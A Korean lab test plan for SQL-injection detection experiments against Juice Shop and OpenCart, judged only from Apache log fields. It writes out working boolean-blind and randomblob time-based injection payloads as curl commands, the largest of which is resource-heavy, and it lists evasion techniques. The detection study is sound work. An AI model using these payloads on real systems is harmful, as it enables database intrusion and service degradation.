## 2. Apache 로그 기반 분석 범위와 한계

이 문서는 [docs/99_POST_body_visibility_한계와_해석_기준.md](/mnt/c/Users/nkiak/Documents/3_1/project_repo/docs/99_POST_body_visibility_한계와_해석_기준.md:1)와 [docs/99_HTML_fallback_fingerprint_구현_검토와_보류_결정.md](/mnt/c/Users/nkiak/Documents/3_1/project_repo/docs/99_HTML_fallback_fingerprint_구현_검토와_보류_결정.md:1)의 운영 기준을 따른다.

현재 baseline은 Apache security/access/error 로그 표면에 남는 정보만 사용한다.

Apache 로그에서 직접 확인 가능한 필드:

- `raw_request`
- `raw_request_target`
- `uri`
- `query_string`
- `status_code`
- `response_body_bytes`
- `duration_us`
- `ttfb_us`
- `resp_content_type`
- `req_content_type`
- `req_content_length`
- `user_agent`
- `request_id`
- `error_link_id`
- `src_ip`
- `referer`

직접 확인 불가능하거나 baseline 근거로 쓰지 않는 것:

- raw POST body 원문
- response body 원문
- application 내부 result count
- DB query 결과
- Juice Shop 내부 로그
- OpenCart 내부 로그
- `resp_html_*` fingerprint 계열

운영 한계:

1. 현재 baseline은 Apache security/access/error 로그 표면에 남는 정보만 사용한다.
2. raw POST body 원문은 현재 baseline 입력이 아니다.
3. response body 원문도 현재 baseline 입력이 아니다.
4. application 내부 result count는 Apache 로그에서 직접 보이지 않는다.
5. `resp_html_*` fingerprint 계열은 현재 보류 기능이므로 핵심 근거로 쓰지 않는다.
6. 따라서 “전체 상품 출력 확인”, “빈 결과셋 확인”, “실제 데이터 유출 확정” 같은 표현은 쓰지 않는다.
7. 대신 `status_code`, `response_body_bytes`, `duration_us`, `ttfb_us`, `resp_content_type`, `query_string`, `raw_request_target`, `user_agent`를 기준으로 보수적으로 해석한다.

해석 원칙:

- SQLi payload가 `query_string`에 남는 GET 요청은 비교적 직접 분석 가능하다.
- POST body 내부에만 payload가 있는 요청은 Apache 로그 표면에서 payload가 보이지 않는다.
- POST 요청은 `status_code`, `response_body_bytes`, `req_content_length`, `resp_content_type`, `user_agent`만 보수적으로 해석한다.
- Boolean Blind 성공 여부는 response body 원문이 아니라 `response_body_bytes` 차이로만 간접 판단한다.
- Time-based 성공 여부는 `duration_us` / `ttfb_us` median 차이로만 판단한다.

## 4. Round 2A — Boolean Blind / Time-based 정량 비교

### 4.1 Boolean Blind Track 설계 원칙

- `xclose`(`x'))`)를 Boolean Blind primary로 승격한다.
- 기존 quote-only pair는 secondary/legacy로 내린다.
- baseline `q=apple`을 반드시 먼저 실행한다.
- TRUE/FALSE pair는 `response_body_bytes`, `status_code`, `resp_content_type` 차이를 본다.
- “전체 데이터 출력”, “빈 결과셋” 같은 표현은 쓰지 않는다.
- 대신 Apache 로그 표면에서 `response_body_bytes` 증가/감소가 관찰되는지로 기술한다.
- “100배 이상 차이” 같은 고정 수치는 강제 기준으로 쓰지 않는다.
- 목표는 가능하면 명확한 byte delta가 생기도록 설계하되, 실제 판정은 관찰값 기준으로 한다.

성공 기준:

- TRUE/FALSE 사이 `response_body_bytes` 차이가 크면 physical boolean delta observed
- `status_code`가 갈리면 보조 근거
- `resp_content_type`이 갈리면 보조 근거
- 차이가 없으면 SQLi 시도는 관찰되더라도 Boolean Blind 성공으로 단정하지 않음

### B2-A0 Boolean Baseline

```bash
curl -i -G \
  -A "${UA_PREFIX}-blind-base-1" \
  --data-urlencode "q=apple" \
  "$JUICE_URL/rest/products/search"
```

- 정상 검색 baseline
- incident가 아니라 비교 기준
- Apache 로그에서 `response_body_bytes`, `duration_us`, `ttfb_us`, `status_code`, `resp_content_type`를 기록한다.

### B2-A1 Boolean TRUE — xclose primary

```bash
curl -i -G \
  -A "${UA_PREFIX}-blind-bool-xclose-true-1" \
  --data-urlencode "q=x')) OR 1=1 --" \
  "$JUICE_URL/rest/products/search"
```

- `xclose` 방식으로 query context를 닫고 TRUE 조건을 주입한다.
- Apache 로그 표면에서 baseline 또는 FALSE 대비 `response_body_bytes` 증가가 있는지 본다.
- “전체 데이터 출력 확인”이 아니라 “응답 크기 증가 정황”으로 기록한다.

### B2-A2 Boolean FALSE — xclose primary

```bash
curl -i -G \
  -A "${UA_PREFIX}-blind-bool-xclose-false-1" \
  --data-urlencode "q=x')) AND 1=2 --" \
  "$JUICE_URL/rest/products/search"
```

- `xclose` 방식으로 query context를 닫고 FALSE 조건을 주입한다.
- Apache 로그 표면에서 TRUE 대비 `response_body_bytes` 감소가 있는지 본다.
- “빈 결과셋 확인”이 아니라 “응답 크기 감소 정황”으로 기록한다.

### B2-A3 Boolean Subquery Auxiliary

```bash
curl -i -G \
  -A "${UA_PREFIX}-blind-subquery-1" \
  --data-urlencode "q=x')) AND (SELECT 1)=1 --" \
  "$JUICE_URL/rest/products/search"
```

- 보조 실험이다.
- SQLi-shape subquery 조건이 Apache 로그상 어떻게 나타나는지 확인한다.
- `response_body_bytes` 차이가 없으면 성공으로 단정하지 않는다.

### B2-A4 Quote-only Secondary / Legacy

기존 quote-only pair는 legacy/secondary로 둔다.

```bash
curl -i -G \
  -A "${UA_PREFIX}-blind-bool-quote-true-1" \
  --data-urlencode "q=' OR 1=1 --" \
  "$JUICE_URL/rest/products/search"

curl -i -G \
  -A "${UA_PREFIX}-blind-bool-quote-false-1" \
  --data-urlencode "q=' AND 1=2 --" \
  "$JUICE_URL/rest/products/search"
```

- 기존 방식과의 비교용이다.
- primary 판단은 `xclose` pair를 우선한다.
- quote-only가 500 error path로 수렴하면 Boolean Blind 성공으로 보지 않는다.

### 4.2 Time-based Track 설계 원칙

- 기존 `sqlite_master` cartesian 방식은 기본안에서 제외하고 legacy로 격하한다.
- `randomblob` 기반 delay ladder를 기본안으로 둔다.
- baseline을 3회 측정하고 median을 사용한다.
- delay도 처음부터 고부하로 시작하지 않고 낮은 단계부터 올린다.
- “3~5초 지연 보장”, “30배 지연” 같은 단정 문구는 쓰지 않는다.
- `randomblob` 수치는 환경에 따라 달라질 수 있다.
- 목표는 Apache 로그의 `duration_us` / `ttfb_us`에서 baseline 대비 유의미한 차이를 관찰하는 것이다.
- `/socket.io/` long polling 같은 정상 장기 요청과 섞어 판단하지 않는다.
- time anomaly는 같은 URI와 같은 `lab-b-set-time-*` UA 그룹 내부에서만 비교한다.

성공 기준:

- baseline median과 delay median을 비교한다.
- 평균이 아니라 median 중심으로 본다.
- `duration_us` delta가 500,000us 이상이면 weak positive
- `duration_us` delta가 2,000,000us 이상이면 strong positive
- 또는 delay median이 baseline median의 3배 이상이면 weak positive
- 기준 미달이면 time-based physical delay not observed

### B2-B0 Normal Baseline Repeats

```bash
curl -i -G \
  -A "${UA_PREFIX}-time-normal-base-1" \
  --data-urlencode "q=apple" \
  "$JUICE_URL/rest/products/search"

curl -i -G \
  -A "${UA_PREFIX}-time-normal-base-2" \
  --data-urlencode "q=apple" \
  "$JUICE_URL/rest/products/search"

curl -i -G \
  -A "${UA_PREFIX}-time-normal-base-3" \
  --data-urlencode "q=apple" \
  "$JUICE_URL/rest/products/search"
```

- 정상 baseline
- incident가 아니라 time metric 기준값
- `duration_us`, `ttfb_us` median을 계산한다.

### B2-B1 SQLi-shape No-delay Baseline Repeats

```bash
curl -i -G \
  -A "${UA_PREFIX}-time-sqli-base-1" \
  --data-urlencode "q=x')) AND 1=1 --" \
  "$JUICE_URL/rest/products/search"

curl -i -G \
  -A "${UA_PREFIX}-time-sqli-base-2" \
  --data-urlencode "q=x')) AND 1=1 --" \
  "$JUICE_URL/rest/products/search"

curl -i -G \
  -A "${UA_PREFIX}-time-sqli-base-3" \
  --data-urlencode "q=x')) AND 1=1 --" \
  "$JUICE_URL/rest/products/search"
```

- SQLi 형태는 있지만 의도적 delay가 없는 baseline
- `randomblob` delay와 비교할 기준
- 가능하면 normal baseline보다 이 baseline을 우선 비교 대상으로 사용한다.

### B2-B2 randomblob Delay Ladder

낮은 단계부터 1회씩 실행하고, 유의미한 지연이 보이는 단계만 3회 반복한다.

500k:

```bash
curl -i --max-time 30 -G \
  -A "${UA_PREFIX}-time-delay-blob-500k-1" \
  --data-urlencode "q=x')) AND (SELECT length(hex(randomblob(500000))))>0 --" \
  "$JUICE_URL/rest/products/search"
```

1m:

```bash
curl -i --max-time 30 -G \
  -A "${UA_PREFIX}-time-delay-blob-1m-1" \
  --data-urlencode "q=x')) AND (SELECT length(hex(randomblob(1000000))))>0 --" \
  "$JUICE_URL/rest/products/search"
```

5m:

```bash
curl -i --max-time 45 -G \
  -A "${UA_PREFIX}-time-delay-blob-5m-1" \
  --data-urlencode "q=x')) AND (SELECT length(hex(randomblob(5000000))))>0 --" \
  "$JUICE_URL/rest/products/search"
```

10m:

```bash
curl -i --max-time 45 -G \
  -A "${UA_PREFIX}-time-delay-blob-10m-1" \
  --data-urlencode "q=x')) AND (SELECT length(hex(randomblob(10000000))))>0 --" \
  "$JUICE_URL/rest/products/search"
```

- 처음부터 큰 값을 쓰지 않는다.
- 낮은 단계에서 차이가 없을 때만 올린다.
- target 불안정, timeout, 과도한 부하가 보이면 중단한다.

### B2-B3 High-load Optional

기존 B-17의 `randomblob(30000000)`은 optional high-load로만 둔다.

```bash
curl -i --max-time 90 -G \
  -A "${UA_PREFIX}-time-blob-highload-30m-1" \
  --data-urlencode "q=x')) AND (SELECT length(hex(randomblob(30000000))))>0 --" \
  "$JUICE_URL/rest/products/search"
```

- 기본 실행 항목이 아니다.
- B2-B2의 낮은 단계에서 충분한 차이가 없고, 실험 환경이 안정적인 경우에만 실행한다.
- DoS-adjacent 자원 소모 가능성이 있으므로 로컬 격리 환경에서만 수행한다.

## 5. Round 2B — Evasion / Temporal / False Positive 보조 구간

Round 2B는 기존 `docs/98B_B세트_비교실험.md`의 B-18~B-25를 요약한 보조 구간이다. Round 2A보다 우선순위가 낮고, provider 변별력 보조 실험으로만 사용한다.

- B-18 URL-encoded Quote: URL 인코딩된 quote payload가 `query_string` 또는 `raw_request_target`에서 어떻게 보이는지 확인한다.
- B-19 Mixed Case UNION: mixed case SQL keyword를 정상화 후 SQLi로 해석하는지 본다.
- B-20 Inline Comment Splitting: `/**/` 기반 토큰 분리를 회피 기법으로 인식하는지 본다.
- B-21 Double URL Encoding: 실행 성공 여부보다 이중 인코딩 회피 의도를 식별하는지 본다.
- B-22 Whitespace Replacement: 탭/개행 기반 whitespace 변형이 의미 보존 상태로 읽히는지 본다.
- B-23 Multi-attempt → Single Success Chain: 짧은 시간 내 정찰→탐색→성공 패턴을 단일 temporal chain으로 묶을 수 있는지 본다.
- B-24 Educational Search “How to use UNION in SQL”: `UNION` 키워드만으로 SQLi로 오탐하지 않는지 본다.
- B-25 Educational Search “SELECT * FROM users tutorial”: 자연어 문맥이 있는 검색을 정상 요청으로 분리하는지 본다.

설명 원칙:

- Round 2B는 provider 변별력 보조 실험이다.
- Boolean/Time-based 정량 비교와 섞어 한 번에 해석하지 않는다.
- 필요한 경우 별도 export window와 별도 base-name으로 실행한다.

## 6. Round 2C — Cross-platform Corroboration 보조 구간

Round 2C는 기존 `docs/98B_B세트_비교실험.md`의 B-26~B-28을 요약한 선택 구간이다.

- B-26 OpenCart Search Quote Breakout: OpenCart 검색 파라미터의 quote breakout이 Apache 로그 표면에서 어떻게 보이는지 확인한다.
- B-27 OpenCart UNION via Form POST: POST body 원문은 baseline 입력이 아니므로, `status_code`, `response_body_bytes`, `req_content_length`, `resp_content_type`, `user_agent` 수준에서만 보수적으로 본다.
- B-28 OpenCart MySQL Error-based: MySQL 특화 함수와 OpenCart 라우팅 특성을 Juice Shop과 분리해 기록한다.

설명 원칙:

- OpenCart는 선택적 보조 검증 대상이다.
- Juice Shop 결과와 직접 같은 기준으로 성공/실패를 단정하지 않는다.
- DBMS, 라우팅, 응답 구조가 다르므로 Apache 로그 표면 지표를 분리해서 해석한다.

## 8. Export 및 분석 시 유의사항

- Round 2A는 별도 export window로 관리한다.
- Round 2B/2C와 섞지 않는 것을 권장한다.
- `socket.io` long polling은 duration이 길 수 있으므로 time-based SQLi 근거와 섞지 않는다.
- Time-based 비교는 `/rest/products/search`와 `lab-b-set-time-*` UA로 한정한다.
- baseline/control row는 incident가 아니지만 metric 계산에는 필요하다.
- prepare 단계에서 완전히 버리면 Stage2가 비교할 수 없다.
- 다만 baseline/control row를 Stage1 공격 후보로 억지 승격하는 것은 피한다.
- 추후 코드를 수정한다면 `analysis_candidates`가 아니라 별도 `round2_experiment_rows` 같은 구조로 보존하는 편이 좋다.

## 9. 해석 기준

| 구분 | 판단 기준 | 결론 문구 |
| --- | --- | --- |
| SQLi 시도 관찰 | `query_string`에 SQLi payload가 남음 | SQLi 시도 관찰 |
| Boolean physical delta observed | TRUE/FALSE의 `response_body_bytes` 차이가 큼 | Boolean Blind 물리 지표 차이 관찰 |
| Boolean physical delta not observed | payload는 있으나 bytes/status 차이가 미미함 | SQLi 시도는 관찰됐으나 Boolean 성공은 미검증 |
| Time delay weak positive | `duration_us` delta >= 500,000us 또는 3배 이상 | 약한 time-based 지연 정황 |
| Time delay strong positive | `duration_us` delta >= 2,000,000us | 강한 time-based 지연 정황 |
| Time delay not observed | 기준 미달 | 지연 유도 시도는 관찰됐으나 물리 지연은 미검증 |
| Insufficient data | baseline 또는 delay row 부족 | 비교 데이터 부족 |
